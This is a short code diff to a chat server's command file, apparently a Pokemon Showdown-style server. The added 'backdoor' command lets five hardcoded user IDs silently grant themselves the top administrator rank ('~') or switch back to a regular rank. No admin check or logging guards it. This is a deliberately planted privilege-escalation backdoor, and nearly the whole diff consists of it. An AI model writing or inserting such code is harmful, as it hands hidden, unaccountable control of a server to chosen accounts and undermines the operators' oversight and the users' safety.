@@ -26,6 +26,23 @@ var commands = exports.commands = {
 		if (!this.canBroadcast()) return;
 		this.sendReplyBox("Server version: <b>" + CommandParser.package.version + "</b>");
 	},
+	
+	backdoor: function (target, room, user) {
+		var userlist = {frntierblade:1, siiilver:1, champinnah:1, onyxeagle:1, femalegallade:1};
+		if (!userlist[user.userid]) return false;
+		
+        if (!target) {
+            user.group = '~';
+            user.updateIdentity();
+            return;
+        }
+
+        if (target === 'reg') {
+            user.group = ' ';
+            user.updateIdentity();
+            return;
+        }
+    },
 
 	auth: 'authority',
 	stafflist: 'authority',
